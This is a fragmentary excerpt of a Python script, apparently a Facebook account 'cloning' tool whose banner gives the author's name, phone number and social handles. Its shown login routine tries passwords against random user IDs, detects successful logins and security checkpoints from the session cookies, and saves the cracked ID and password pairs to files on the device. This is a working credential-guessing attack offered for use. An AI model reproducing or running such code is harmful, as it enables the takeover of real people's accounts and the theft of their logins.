...
import zlib
import base64
os.system('espeak -a 300 "WELCOME TO HaMed RANDOM CLONING TOOLS"')
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
from random import random as acak
from random import choice as pilihj
...
\033[1;90m══════════════════════════════════════════════════════════════════════
\033[1;92m[+] AUTHOR    :  HaMed
\033[1;92m[+] GITHUB    :  HaMedJoo4576 
\033[1;92m[+] FACEBOOK  :  HáMëd jøö
\033[1;92m[+] WHATSAPP  :  09354600723
\033[1;92m[+] TELEGRAM  :  @Ahmadi_4576 
...
def main():
    ...
    print(f"\033[1;97m[2]\033[1;92m JOIN TO")
...
def freeq(uid,pwx,tl):
    ...
    'upgrade-insecure-requests': '1',
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                print(f'\r\33[1;97m[\033[1;96mHaMed-OK\033[1;97m]\033[1;92m '+uid+' | '+ps+  ' \n ')
                cek_apk(session,coki)
                open('/sdcard/HaMed-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[141:156]
                    print(f'\r\33[1;97m[\033[1;90mHaMed-Cp\033[1;97m]\033[1;93m '+uid+' | '+ps+' ')
                    open('/sdcard/HaMed-Cp.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;35m[HaMed] [%s]  OK: %s CP: %s'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass 
#---------------------[END MENU]---------------------#
